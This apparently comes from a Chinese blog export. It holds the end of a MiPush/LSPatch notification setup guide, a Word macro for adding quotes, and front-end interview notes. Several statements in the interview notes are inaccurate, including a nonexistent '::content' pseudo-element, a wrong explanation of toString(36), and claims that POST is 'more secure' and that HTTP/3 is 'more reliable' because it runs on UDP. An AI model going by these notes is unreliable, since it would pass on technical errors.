<p>所以通过配置 Mipush 就可以带来体验不错的正常通知体验, 而且不需要 Root, 缺点就是升级应用需要重新打补丁</p>
<p>此方法不仅限于 OneUI, 其他系统也通用</p>
<p>相关链接:</p>
<ol>
<li class="lvl-3">
<p><a href="https://bzmshang.top/MiPush-Framework_User-Guide">https://bzmshang.top/MiPush-Framework_User-Guide</a></p>
</li>
<li class="lvl-3">
<p><a href="https://github.com/NihilityT/MiPushConfigurations/tree/main">https://github.com/NihilityT/MiPushConfigurations/tree/main</a></p>
</li>
<li class="lvl-3">
<p><a href="https://github.com/NihilityT/MiPushFramework">https://github.com/NihilityT/MiPushFramework</a></p>
</li>
<li class="lvl-3">
<p><a href="https://github.com/LSPosed/LSPatch">https://github.com/LSPosed/LSPatch</a></p>
</li>
<li class="lvl-3">
<p><a href="https://github.com/NihilityT/MiPush">https://github.com/NihilityT/MiPush</a></p>
</li>
</ol>
<h2 id="安装步骤">安装步骤:</h2>
<ol>
<li class="lvl-3">
<p>安装<code>LSPatch</code> (<code>链接4</code></p>
</li>
<li class="lvl-3">
<p>安装<code>推送服务</code>App (<code>链接3</code></p>
</li>
<li class="lvl-3">
<p>安装 push 模块(各个模块对应用的支持情况都不同, 支持情况见下表, 这里推荐 Mipush 模块, 官方实现 (链接 5</p>
<ol>
<li class="lvl-7">
<table>
<thead>
<tr>
<th>MiPush</th>
<th>MiPush<br />Faker</th>
<th>MiPush<br />DeviceFake</th>
</tr>
</thead>
<tbody>
<tr>
<td>QQ</td>
<td>QQ</td>
<td>B 站</td>
</tr>
<tr>
<td>QQ<br />邮箱</td>
<td>QQ<br />邮箱</td>
<td>酷安</td>
</tr>
<tr>
<td>淘宝</td>
<td>淘宝</td>
<td>百度</td>
</tr>
<tr>
<td>闲鱼</td>
<td>闲鱼</td>
<td>微博</td>
</tr>
<tr>
<td>抖音</td>
<td>菜鸟</td>
<td>支付宝</td>
</tr>
<tr>
<td>京东</td>
<td>米游社</td>
<td>拼多多</td>
</tr>
<tr>
<td>今日<br />头条</td>
<td>APP<br />分享</td>
<td>高德<br />地图</td>
</tr>
<tr>
<td>哈啰</td>
<td>哔哩哔哩<br />漫画</td>
<td></td>
</tr>
<tr>
<td>小红书</td>
<td>小宇宙</td>
<td></td>
</tr>
<tr>
<td>Boss<br />直聘</td>
<td>支付宝</td>
<td></td>
</tr>
<tr>
<td></td>
<td>浙政钉</td>
<td></td>
</tr>
<tr>
<td></td>
<td>饿了么</td>
<td></td>
</tr>
<tr>
<td></td>
<td>美团</td>
<td></td>
</tr>
</tbody>
</table>
</li>
</ol>
</li>
<li class="lvl-3">
<p>安装<code>Shizuku</code>, 给<code>LSPatch</code>授权</p>
</li>
<li class="lvl-3">
<p>使用<code>LSPatch</code>给需要通知的应用打补丁, 模式选择<code>Intergrated</code>, 然后点击嵌入模块, 选择第三步安装的某个 push 模块, 打完补丁后安装即可</p>
</li>
<li class="lvl-3">
<p>打开软件, 正常登录即可</p>
</li>
<li class="lvl-3">
<p>在<code>推送服务</code>App 中检查应用状态, 如果还是未注册, 那么强制停止应用后重试</p>
</li>
<li class="lvl-3">
<p>在<code>推送服务</code>App 中设置通知配置文件: 为了支持某些高级功能, 比如支持 qq 显示多条消息, 需要设置配置文件</p>
<ol>
<li class="lvl-7">在<code>推送服务</code>App 中点击设置, 然后将<code>设置配置目录</code>设置为某个目录, 然后将需要设置的配置文件放置其中, 作者提供的配置文件见<code>链接2</code></li>
<li class="lvl-7">比如 qq 的配置文件, 需要放置以下三个文件 <code>0_基础配置（必需品）</code>+<code>com.tencent.mobileqq_QQ</code>＋<code>com.tencent.mobileqq_QQ_MessagingStyle</code></li>
</ol>
</li>
</ol>
<h2 id="应用后续升级方法">应用后续升级方法</h2>
<ol>
<li class="lvl-3">
<p>获取应用 apk</p>
</li>
<li class="lvl-3">
<p>使用 LSPatch 打补丁</p>
</li>
<li class="lvl-3">
<p>覆盖安装即可, 应用数据不会丢失</p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件技巧</category>
      </categories>
      <tags>
        <tag>Mipush</tag>
      </tags>
  </entry>
  <entry>
    <title>word 快速给选中内容添加引号</title>
    <url>/20230429/word-%E5%BF%AB%E9%80%9F%E7%BB%99%E9%80%89%E4%B8%AD%E5%86%85%E5%AE%B9%E6%B7%BB%E5%8A%A0%E5%BC%95%E5%8F%B7/</url>
    <content><![CDATA[<p>最近改论文的时候, 经常需要给特定的内容添加引号. vscode 等编辑器使用多了就很希望 word 也能有给选中内容快速添加引号的功能</p>
<p>这个需求我们可以使用宏快速实现</p>
<h2 id="步骤">步骤</h2>
<ol>
<li class="lvl-3">
<p>点击 <code>视图</code> =&gt; <code>宏</code> =&gt; <code>创建</code></p>
</li>
<li class="lvl-3">
<p>在编辑器中输入以下内容</p>
 <figure class="highlight vb"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AddQuotes()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">Dim</span> sBegQ <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line">    <span class="keyword">Dim</span> sEndQ <span class="keyword">As</span> <span class="type">String</span></span><br><span class="line"></span><br><span class="line">    sBegQ = <span class="string">&quot;“&quot;</span></span><br><span class="line">    sEndQ = <span class="string">&quot;”&quot;</span></span><br><span class="line"></span><br><span class="line">    Selection.InsertBefore sBegQ</span><br><span class="line">    Selection.InsertAfter sEndQ</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li class="lvl-3">
<p>在<code>文件</code> =&gt; <code>选项</code> =&gt; <code>自定义工作区</code> =&gt; <code>键盘快捷方式-自定义</code> 中 , <code>类别</code>选择<code>宏</code>, <code>宏</code>选择刚刚添加的<code>宏</code>,然后在<code>请按新快捷键</code>中绑定一个快捷键, 点击指定快捷键后关闭页面即可.<img src="2023-04-29T212823.png" alt="2023-04-29T212823"></p>
</li>
<li class="lvl-3">
<p>然后即可选中文字按快捷键插入引号了.🎉🎉🎉</p>
</li>
</ol>
]]></content>
      <categories>
        <category>软件技巧</category>
      </categories>
      <tags>
        <tag>word</tag>
      </tags>
  </entry>
  <entry>
    <title>前端面试题总结</title>
    <url>/20230727/%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1>面试</h1>
<h3 id="自我介绍">自我介绍</h3>
<h3 id="url-转化格式">url 转化格式</h3>
<p>比如 <code>https:abc.com?a=1＆b=2</code>​ 转化为</p>
<p><code>&#123; host:'xxx', query:&#123;a:1,b:2&#125; &#125;,</code>​</p>
<p>使用 JS 将 URL 转化为所需格式的代码:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">parseURL</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> parsedURL = <span class="keyword">new</span> <span class="title function_">URL</span>(url);</span><br><span class="line">    <span class="keyword">const</span> host = parsedURL.<span class="property">host</span>;</span><br><span class="line">    <span class="keyword">const</span> searchParams = parsedURL.<span class="property">searchParams</span>;</span><br><span class="line">    <span class="keyword">const</span> query = &#123;&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">const</span> [key, value] <span class="keyword">of</span> searchParams) &#123;</span><br><span class="line">        query[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> &#123; host, query &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> url = <span class="string">&quot;https://abc.com?a=1&amp;b=2&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> parsedURL = <span class="title function_">parseURL</span>(url);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(parsedURL); <span class="comment">// &#123;host: &quot;abc.com&quot;, query: &#123;a: &quot;1&quot;, b: &quot;2&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
<p>现在您可以使用 <code>parseURL</code>​ 函数将任何 URL 转换为所需的格式。</p>
<p>‍</p>
<hr>
<h3 id="pre-​​-标签作用"><code>&lt;pre&gt;</code>​​ 标签作用</h3>
<p>‍</p>
<p>在 HTML 中，<code>&lt;pre&gt;</code> ​ 标记的作用是定义预格式化文本。<code>&lt;pre&gt;</code> ​ 标签内的文本会保留所有空白字符和换行符，而不会将它们转换为 HTML 中的空格和换行符。</p>
<p><code>&lt;pre&gt;</code>​ 标签通常用于展示代码示例或其他需要保留空格和格式的文本。预格式化文本可以使代码示例更易于阅读和复制。</p>
<p>示例代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;pre&gt;</span><br><span class="line">  function greet(name) &#123;</span><br><span class="line">    console.log(&quot;Hello, &quot; + name + &quot;!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  greet(&quot;Alice&quot;);</span><br><span class="line">&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码使用 <code>&lt;pre&gt;</code>​ 标记，将空格和换行符正常地显示在页面上，从而生成以下展示效果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function greet(name) &#123;</span><br><span class="line">  console.log(&quot;Hello, &quot; + name + &quot;!&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">greet(&quot;Alice&quot;);</span><br></pre></td></tr></table></figure>
<p>‍</p>
<h3 id="生成随机字符串">生成随机字符串</h3>
<p><code>Math.random().toString(36).slice(2)</code>​</p>
<p>这行代码实际上是生成一个随机的字符串，具体过程如下：</p>
<ol>
<li class="lvl-3">
<p>Math.random() 会生成一个 0 到 1 之间的随机小数。</p>
</li>
<li class="lvl-3">
<p>toString(36) 将该随机小数转化为 36 进制数字表示。即将小数点后所有位依次乘以 36 的不同正整数幂（个位对应 36^0, 十位对应 36^1, 百位对应 36^2…），得到的结果倒序排列再连接起来就是 36 进制表示的数字了。其中数字 0-9 对应原样输出，10-35 则用 a-z 字母代替。</p>
</li>
<li class="lvl-3">
<p>slice(2) 是从 36 进制表示的字符串的第二位开始截取，目的是去除掉这个字符串开头的&quot;0.&quot;</p>
</li>
</ol>
<p>因此，在执行完该行代码后，返回的结果将是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">一个由10位以下的小写英文字母和阿拉伯数字随意组合而成的随机字符串。</span><br></pre></td></tr></table></figure>
<p>‍</p>
<h3 id="说一下-http-的请求方法">说一下 http 的请求方法</h3>
<p>GET:获取资源,只请求获取资源,不修改资源。<br>
POST:向服务器提交数据,通常会导致资源的修改或者创建。<br>
PUT:上传文件或数据,会导致资源被创建或修改,与 POST 类似。<br>
DELETE:删除资源。<br>
HEAD: 获取报文首部信息,用于获取报文首部元信息,而不获取响应体内容。<br>
OPTIONS:用于查询支持的请求方法,比如查询该 URL 支持 GET、POST 哪些方法。<br>
CONNECT:把请求转化为对所请求资源的双向隧道,主要用于代理服务器的连接。<br>
TRACE:追踪路径,用于测试或诊断。</p>
<h3 id="get-和-post-区别">get 和 post 区别</h3>
<p>GET 和 POST 都是 HTTP 协议常用的两种请求方法,它们的区别如下:</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>获取资源的方式不同:<br>
GET 通过 URL 参数传递,数据放在 URL 中,对数据量有限制。<br>
POST 通过请求体传递,数据放在请求体中,对数据量无限制。</p>
</li>
<li class="lvl-4">
<p>安全性不同:<br>
GET 请求参数可被缓存,会保留在浏览器历史记录中。<br>
POST 请求对参数编码,不会被缓存,更安全</p>
</li>
<li class="lvl-4">
<p>对服务器端的影响不同:<br>
GET 对服务器端是只读的,不会修改服务器端资源。<br>
POST 可能会修改服务器端资源,如添加、更新、删除等操作。</p>
</li>
<li class="lvl-4">
<p>可见性不同:<br>
GET 请求参数可在 URL 中看到。<br>
POST 请求参数不可见。</p>
</li>
<li class="lvl-4">
<p>幂等性不同:<br>
GET 请求多次执行的效果和执行一次相同,所以是幂等的。<br>
POST 请求多次执行的效果和执行一次不同,所以不是幂等的。总之,GET 更适合用于获取资源,POST 更适合用于修改服务器端资源。选择合适的请求方法很重要。</p>
</li>
</ul>
<h2 id="transition-有哪些属性">transition 有哪些属性</h2>
<p>CSS transition 主要包含以下几个属性:</p>
<ol>
<li class="lvl-3">
<p>transition-property:指定应用过渡效果的 CSS 属性名,默认值为 all,表示所有属性都应用过渡效果。</p>
</li>
<li class="lvl-3">
<p>transition-duration:指定过渡效果的持续时间,如 0.5s。</p>
</li>
<li class="lvl-3">
<p>transition-timing-function:指定过渡函数,定义过渡效果的速度曲线,如 linear、ease、ease-in 等。</p>
</li>
<li class="lvl-3">
<p>transition-delay:定义过渡效果开始前的延迟间隔,如 0.5s。</p>
</li>
<li class="lvl-3">
<p>transition:作为简写属性,包含上面四个属性,不需要以特定顺序书写属性值。</p>
</li>
</ol>
<h3 id="讲一下-transform-的属性及应用">讲一下 transform 的属性及应用</h3>
<p>CSS 中的 transform 属性用于对元素进行旋转、缩放、移动或倾斜 transform 的主要属性包括:</p>
<ol>
<li class="lvl-3">
<p>transform-origin: transform 的基点位置。</p>
</li>
<li class="lvl-3">
<p>transform-function:具体的 transform 函数,如:</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>rotate():旋转</p>
</li>
<li class="lvl-4">
<p>scale():缩放</p>
</li>
<li class="lvl-4">
<p>translate():位移</p>
</li>
<li class="lvl-4">
<p>skew():倾斜</p>
</li>
</ul>
<ol start="3">
<li class="lvl-3">
<p>transform-style:transform 子元素的布局方式。</p>
</li>
</ol>
<h3 id="css-响应式布局哪些单位">css 响应式布局哪些单位</h3>
<p>响应式布局主要利用 CSS3 中的一些新单位来实现元素的尺寸与页面大小适配。常见的 CSS 响应式布局单位包括:</p>
<ol>
<li class="lvl-3">
<p>vw:视窗宽度的 1/100,元素尺寸随视窗宽度改变。</p>
</li>
<li class="lvl-3">
<p>vh:视窗高度的 1/100,元素尺寸随视窗高度改变。</p>
</li>
<li class="lvl-3">
<p>rem:相对于根元素字体大小的单位。</p>
</li>
<li class="lvl-3">
<p>em:相对于父元素字体大小的单位。</p>
</li>
<li class="lvl-3">
<p>%:百分比单位,相对于父元素的百分比尺寸。</p>
</li>
<li class="lvl-3">
<p>flex:Flexible Box 布局,用来适应不同屏幕。</p>
</li>
<li class="lvl-3">
<p>media query:@media 规则,根据不同媒体查询适配样式。</p>
</li>
</ol>
<p>响应式布局的实现方法:</p>
<ol>
<li class="lvl-3">
<p>弹性图片:max-width: 100% 使图片宽度随容器变化。</p>
</li>
<li class="lvl-3">
<p>弹性布局:用 flex、grid、max-width、media query 等。</p>
</li>
<li class="lvl-3">
<p>弹性文本:使用 em、rem、vw、vh 等单位。</p>
</li>
</ol>
<p>利用这些 CSS 单位和方法可以非常灵活地实现元素的响应式尺寸,适配各种设备的视窗大小,构建出优秀的响应式网站。</p>
<h3 id="部署的流程-怎么解决跨域的">部署的流程 怎么解决跨域的</h3>
<p>手动部署: 打包后放到 nginx 服务器文件夹内</p>
<p>自动化部署: 使用 vercel 等自动化部署平台</p>
<p>跨域解决方法:</p>
<ol>
<li class="lvl-3">
<p>代理</p>
</li>
<li class="lvl-3">
<p>cors</p>
</li>
<li class="lvl-3">
<p>jsonp</p>
</li>
</ol>
<h3 id="防抖和节流-应用及口述伪代码">防抖和节流 应用及口述伪代码</h3>
<p>防抖(debounce)和节流(throttle)都是对事件触发频率的控制技术,常用于优化高频率执行的函数。</p>
<p><strong>防抖</strong>:指触发事件后在一定时间内没有再触发事件,则执行函数。</p>
<p>应用场景:搜索输入提示、窗口调整大小等。</p>
<p><strong>节流</strong>:间隔一定时间执行一次函数。</p>
<p>应用场景:滚动加载更多、点击提交等。</p>
<p>防抖适合处理最后一次事件触发的场景;节流适合处理持续触发事件的场景。合理使用可以有效优化页面性能,提升用户体验。</p>
<p>‍</p>
<h3 id="webpack-是怎么用的-从头说一下">webpack 是怎么用的 从头说一下</h3>
<p>Webpack 是一个模块打包器,其基本工作流程は以下几步:</p>
<ol>
<li class="lvl-3">
<p>新建一个项目,初始化包管理配置(npm init)</p>
</li>
<li class="lvl-3">
<p>安装 Webpack 和必要的加载器及插件(如 webpack webpack-cli style-loader css-loader)</p>
</li>
<li class="lvl-3">
<p>在项目根目录下新建 webpack.config.js 文件,配置入口文件、输出文件、模块规则等</p>
</li>
<li class="lvl-3">
<p>项目源码根目录下创建 src 源码目录,编写代码</p>
</li>
<li class="lvl-3">
<p>在 package.json scripts 中添加 webpack 命令,用于打包(如 “build”: “webpack”)</p>
</li>
<li class="lvl-3">
<p>根目录下运行 webpack 命令进行打包,会生成 dist 目录及打包后的文件</p>
</li>
<li class="lvl-3">
<p>在 src/index.html 中通过 script 标签引入打包生成的 js 文件</p>
</li>
<li class="lvl-3">
<p>运行 index.html 查看效果</p>
</li>
<li class="lvl-3">
<p>可以继续完善配置:添加 HTML、CSS 等加载器,提取 CSS 文件,添加 devServer 等</p>
</li>
<li class="lvl-4">
<p>通过 npm run build 进行生产环境打包</p>
</li>
</ol>
<h3 id="讲一下-jwt">讲一下 jwt</h3>
<p>JWT(JSON Web Token)是一种可用于用户认证的标准方式,主要由三部分组成:</p>
<p>头部(Header):包含加密算法信息</p>
<p>负载(Payload):存放有效信息的地方</p>
<p>签名(Signature):对头部和负载内容通过加密算法生成</p>
<p>工作流程:</p>
<ol>
<li class="lvl-3">
<p>用户登录,验证成功后服务端生成 JWT 并返回给客户端。</p>
</li>
<li class="lvl-3">
<p>客户端存储 JWT,并在每次请求时带上该 JWT。</p>
</li>
<li class="lvl-3">
<p>服务端验证 JWT 签名是否正确,如果正确则用户保持登录状态。</p>
</li>
</ol>
<p>JWT 的优点是在用户跨服务调用时可以传递信息;缺点是占用存储空间,不能在 JWT 中存储大量信息。需要根据具体业务场景选择是否使用 JWT。</p>
<p>‍</p>
<h3 id="var-let-const-区别">var let const 区别</h3>
<p>var、let 和 const 都是 JavaScript 用来声明变量的关键字,主要区别为:</p>
<ol>
<li class="lvl-3">
<p>作用域不同</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>var 声明的变量只有全局作用域和函数作用域</p>
</li>
<li class="lvl-4">
<p>let 和 const 声明的变量有块级作用域</p>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p>变量提升不同</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>var 声明的变量会提升到作用域顶部</p>
</li>
<li class="lvl-4">
<p>let 和 const 不会发生变量提升</p>
</li>
</ul>
<ol start="3">
<li class="lvl-3">
<p>暂时性死区</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>let 和 const 声明的变量会有一个暂时性死区</p>
</li>
<li class="lvl-4">
<p>在声明前使用会引起错误</p>
</li>
</ul>
<ol start="4">
<li class="lvl-3">
<p>是否能重复声明</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>var 可以重复声明同一变量</p>
</li>
<li class="lvl-4">
<p>let 和 const 不允许在同一作用域重复声明</p>
</li>
</ul>
<ol start="5">
<li class="lvl-3">
<p>是否能重新赋值</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>var 和 let 可以重新赋值</p>
</li>
<li class="lvl-4">
<p>const 声明的变量不能被重新赋值</p>
</li>
</ul>
<p>综上,使用 let 和 const 替代 var 可以使代码更安全,所以在 ES6 中应优先使用 let 和 const 来声明变量。</p>
<h3 id="讲一下-xss-和-csrf">讲一下 xss 和 csrf</h3>
<p>XSS 和 CSRF 是 Web 应用中常见的两类安全威胁:</p>
<p>XSS(跨站脚本攻击):</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>攻击者通过在页面注入恶意代码实现攻击效果。</p>
</li>
<li class="lvl-4">
<p>比如通过注入 JavaScript 代码获取用户数据、劫持会话等。</p>
</li>
<li class="lvl-4">
<p>防御方法有对用户输入进行过滤、输出编码等。</p>
</li>
</ul>
<p>CSRF(跨站请求伪造):</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>攻击者盗用用户状态,以用户名义发送恶意请求。</p>
</li>
<li class="lvl-4">
<p>比如盗取用户的登录状态,修改用户数据,发布内容等。</p>
</li>
<li class="lvl-4">
<p>防御方法有校验请求来源、添加 token、Referer 校验等。</p>
</li>
</ul>
<p>总结防御 XSS 和 CSRF 的方法:</p>
<ol>
<li class="lvl-3">
<p>输入过滤,过滤特殊字符。</p>
</li>
<li class="lvl-3">
<p>输出时编码转换,防止作为代码执行。</p>
</li>
<li class="lvl-3">
<p>避免直接使用用户输入。</p>
</li>
<li class="lvl-3">
<p>避免直接在 DOM 中插入用户内容。</p>
</li>
<li class="lvl-3">
<p>同源策略,不被同源限制的场景需谨慎处理。</p>
</li>
<li class="lvl-3">
<p>CSRF Token 同步验证请求来源。</p>
</li>
<li class="lvl-3">
<p>限制和验证重要操作权限。</p>
</li>
<li class="lvl-3">
<p>HTTPS 加密传输保证完整性。</p>
</li>
</ol>
<p>防范 XSS 和 CSRF 需要既了解其攻击原理,又要熟悉防御方法。</p>
<p>‍</p>
<h3 id="es6-新特性">es6 新特性</h3>
<p>ES6 添加了许多新的语言特性,主要的有:</p>
<ol>
<li class="lvl-3">
<p>let 和 const: 块级作用域变量声明</p>
</li>
<li class="lvl-3">
<p>箭头函数:简化函数定义语法</p>
</li>
<li class="lvl-3">
<p>类:实现面向对象编程</p>
</li>
<li class="lvl-3">
<p>模块:实现模块化编程</p>
</li>
<li class="lvl-3">
<p>Promise:用于异步编程</p>
</li>
<li class="lvl-3">
<p>模板字符串:简化字符串拼接</p>
</li>
<li class="lvl-3">
<p>解构赋值:简化提取属性值</p>
</li>
<li class="lvl-3">
<p>参数默认值:简化参数处理</p>
</li>
<li class="lvl-3">
<p>延展运算符:替代 apply 方法</p>
</li>
<li class="lvl-4">
<p>对象属性增强:属性声明简写等</p>
</li>
<li class="lvl-4">
<p>Set/Map:集合与映射数据结构</p>
</li>
<li class="lvl-4">
<p>Proxy/Reflect:元编程功能</p>
</li>
<li class="lvl-4">
<p>生成器:控制函数执行过程</p>
</li>
<li class="lvl-4">
<p>async/await:简化异步代码</p>
</li>
</ol>
<h3 id="箭头函数的-this-指向，用法">箭头函数的 this 指向，用法</h3>
<p>没有自己的 this，指向上下文 context 的 this，用法如果一行且用 ( ) 包裹可以省略 return，如果多行需要写返回值</p>
<h3 id="async-await-解决的问题">async await 解决的问题</h3>
<p>地狱回调，代码更优雅，yield Generator</p>
<h3 id="详细说说数组-splice-方法">详细说说数组 splice 方法</h3>
<p><code>arr.splice(操作元素下标, 删除几个元素[, 要添加的元素...])</code>​</p>
<h3 id="html5-新特性">html5 新特性</h3>
<p>HTML5 新增的主要特性包括:</p>
<ol>
<li class="lvl-3">
<p>新语义化标签:article、footer、header、nav 等,更好描述页面结构。</p>
</li>
<li class="lvl-3">
<p>多媒体标签:video、audio、canvas 等,用于媒体播放、2D 绘图。</p>
</li>
<li class="lvl-3">
<p>表单控件:calendar、date、time、email 等,更好支持表单交互。</p>
</li>
<li class="lvl-3">
<p>新的 API:</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>地理位置:Geolocation API 获取用户位置。</p>
</li>
<li class="lvl-4">
<p>本地存储:localStorage 和 sessionStorage 存储数据于本地。</p>
</li>
<li class="lvl-4">
<p>网络状态:允许检测用户网络状态变化。</p>
</li>
<li class="lvl-4">
<p>Web Worker:支持多线程处理。</p>
</li>
<li class="lvl-4">
<p>WebSocket:实现实时通信功能。</p>
</li>
</ul>
<ol start="5">
<li class="lvl-3">
<p>CSS3 特性:transition、animation、transform 等,实现复杂效果。</p>
</li>
<li class="lvl-3">
<p>其他:微数据(microdata)、MathML 数学标记等。</p>
</li>
</ol>
<p>总体来说,HTML5 致力于页面语义、本地存储、设备访问、多线程、2D/3D 图形、增强表单等方面的功能改进与增强,极大地丰富了网页应用的可能性。</p>
<h3 id="WebAssembly">WebAssembly</h3>
<h3 id="Navigator">Navigator</h3>
<h3 id="对于-BFC-的理解">对于 BFC 的理解</h3>
<h3 id="对于伪类元素的理解">对于伪类元素的理解</h3>
<p>CSS 中常用的伪元素主要包括:</p>
<ol>
<li class="lvl-3">
<p>::before 和 ::after</p>
</li>
</ol>
<p>用于在元素前后插入生成内容,常用于清除浮动、插入装饰性内容等。</p>
<ol start="2">
<li class="lvl-3">
<p>::first-line 和 ::first-letter</p>
</li>
</ol>
<p>用于设置元素首行或首字母的样式。</p>
<ol start="3">
<li class="lvl-3">
<p>::selection</p>
</li>
</ol>
<p>设置元素被选中的样式。</p>
<ol start="4">
<li class="lvl-3">
<p>::placeholder</p>
</li>
</ol>
<p>设置输入框占位文字的样式。</p>
<ol start="5">
<li class="lvl-3">
<p>::marker</p>
</li>
</ol>
<p>设置列表项标记的样式。</p>
<ol start="6">
<li class="lvl-3">
<p>::backdrop</p>
</li>
</ol>
<p>设置元素背景层的样式。</p>
<ol start="7">
<li class="lvl-3">
<p>::content</p>
</li>
</ol>
<p>用于插入元素生成的内容。</p>
<p>伪元素使用两个冒号表示,可以设置常规元素无法控制的样式效果,十分强大。但要注意浏览器兼容性问题。</p>
<p>常用的主要是::before 和::after 来在元素中插入内容实现各种页面效果。正确掌握可以减少不必要的 HTML 标签。</p>
<h3 id="对于伪类选择器的理解">对于伪类选择器的理解</h3>
<p>// :hover :focus :nth-child :not …</p>
<h3 id="对于-dom，bom-操作的理解">对于 dom，bom 操作的理解</h3>
<h3 id="如何识别访问设备，比如移动端，ipad-端，pc-等">如何识别访问设备，比如移动端，ipad 端，pc 等</h3>
<p>useragent ua</p>
<h3 id="介绍-websocket">介绍 websocket</h3>
<p>WebSocket 是 HTML5 开始提供的一种在单个 TCP 连接上进行全双工通讯的协议。其主要特点和使用方式如下:</p>
<ul class="lvl-0">
<li class="lvl-4">
<p>允许服务器主动向客户端推送数据,更实时。</p>
</li>
<li class="lvl-4">
<p>建立在 TCP 协议之上,和 HTTP 协议不同,更轻量和高效。</p>
</li>
<li class="lvl-4">
<p>可以发送文本或二进制数据,没有同源限制。</p>
</li>
<li class="lvl-4">
<p>API 使用简单,主要通过 WebSocket 对象操作。</p>
</li>
<li class="lvl-4">
<p>支持事件监听,如 onopen、onclose、onmessage 等。</p>
</li>
</ul>
<p>使用示例:</p>
<ol>
<li class="lvl-3">
<p>客户端创建 WebSocket 对象,指明服务端地址。</p>
</li>
<li class="lvl-3">
<p>通过 onopen 事件回调建立连接。</p>
</li>
<li class="lvl-3">
<p>onmessage 事件回调获取服务端数据。</p>
</li>
<li class="lvl-3">
<p>通过 send() 方法向服务端发送数据。</p>
</li>
<li class="lvl-3">
<p>onclose 事件回调处理关闭连接。</p>
</li>
</ol>
<p>WebSocket 非常适合即时应用、聊天室等对实时数据交互要求高的场景,可以大幅优化传统 HTTP 短轮询的模式。</p>
<h3 id="http1-1，2-0，3-0-区别">http1.1，2.0，3.0 区别</h3>
<p>HTTP 协议从 1.1 到 3.0 有了很大的进步,主要区别为:</p>
<ol>
<li class="lvl-3">
<p>HTTP/1.1</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>请求管道化,支持持久连接,管道化请求提高效率。</p>
</li>
<li class="lvl-4">
<p>支持断点传输、分块传输编码,提高大文件传输效率。</p>
</li>
<li class="lvl-4">
<p>增加缓存处理,有条件请求及响应等缓存机制。</p>
</li>
</ul>
<ol start="2">
<li class="lvl-3">
<p>HTTP/2</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>采用二进制格式传输数据,更加轻量及高效。</p>
</li>
<li class="lvl-4">
<p>支持多路复用,同一连接并行传输多请求与响应。</p>
</li>
<li class="lvl-4">
<p>支持流优先级及流依赖,优化资源调度。</p>
</li>
<li class="lvl-4">
<p>支持头部压缩,减少协议开销。</p>
</li>
</ul>
<ol start="3">
<li class="lvl-3">
<p>HTTP/3</p>
</li>
</ol>
<ul class="lvl-0">
<li class="lvl-4">
<p>基于 UDP 协议及 QUIC 传输协议,更可靠。</p>
</li>
<li class="lvl-4">
<p>支持 0-RTT 连接,省去握手开销。</p>
</li>
<li class="lvl-4">
<p>支持流优先级及依赖性,智能调度。</p>
</li>
<li class="lvl-4">
<p>支持内建缓存、安全验证等新特性。</p>
</li>
</ul>
<p>总体来说,HTTP 协议不断演进,使传输效率越来越高,减少延迟,从而能搭建越来越高性能的 web 应用。这需要客户端、服务器都支持新的 HTTP 版本来实现优化。</p>
<h3 id="http-和-https-区别">http 和 https 区别</h3>
<p>HTTP 和 HTTPS 的主要区别如下:</p>
<ol>
<li class="lvl-3">
<p>连接方式不同。HTTP 是超文本传输协议,信息是明文传输;HTTPS 则是有 SSL 层的 HTTP 安全版协议,信息加密传输。</p>
</li>
<li class="lvl-3">
<p>端口不同。HTTP 默认端口 80,HTTPS 默认端口 443。</p>
</li>
<li class="lvl-3">
<p>安全性不同。HTTPS 协议由于加密,防止数据在传输过程中被窃取、篡改,因此更安全。</p>
</li>
<li class="lvl-3">
<p>信任度不同。HTTPS 使用证书验证服务器身份,更可信。</p>
</li>
<li class="lvl-3">
<p>速度不同。HTTPS 需要进行加解密运算,会略微增加传输时间。</p>
</li>
<li class="lvl-3">
<p>搜索引擎优化影响不同。Google 等搜索引擎会给予 HTTPS 更高权重。</p>
</li>
<li class="lvl-3">
<p>价格不同。HTTPS 证书需要购买,需要证书授权机构验证。</p>
</li>
</ol>
<p>主要区别在于 HTTP 是不安全的,而 HTTPS 是安全的 HTTP 通道。在传输敏感信息时,必须使用 HTTPS 协议来加密数据。但也要考虑成本和速度损失。</p>
<h3 id="行内元素和块级元素的区别">行内元素和块级元素的区别</h3>
